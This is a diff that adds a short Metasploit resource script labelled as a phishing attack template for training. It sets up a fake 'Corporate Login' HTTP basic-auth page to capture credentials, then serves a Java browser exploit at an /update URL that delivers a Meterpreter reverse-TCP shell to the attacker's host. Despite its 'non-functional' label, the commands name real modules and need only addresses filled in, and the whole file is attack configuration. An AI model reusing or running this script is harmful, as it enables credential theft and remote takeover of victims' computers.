@@ -1,0 +1,18 @@
+# Phishing Attack Template
+# For Training Use – Non-functional Template
+
+use auxiliary/server/capture/http_basic
+set SRVHOST <LHOST>
+set SRVPORT 80
+set REALM Corporate Login
+set URIPATH /login
+run -j
+
+use exploit/multi/browser/java_jre17_exec
+set PAYLOAD java/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set SRVHOST <LHOST>
+set SRVPORT 8080
+set URIPATH /update
+exploit -j
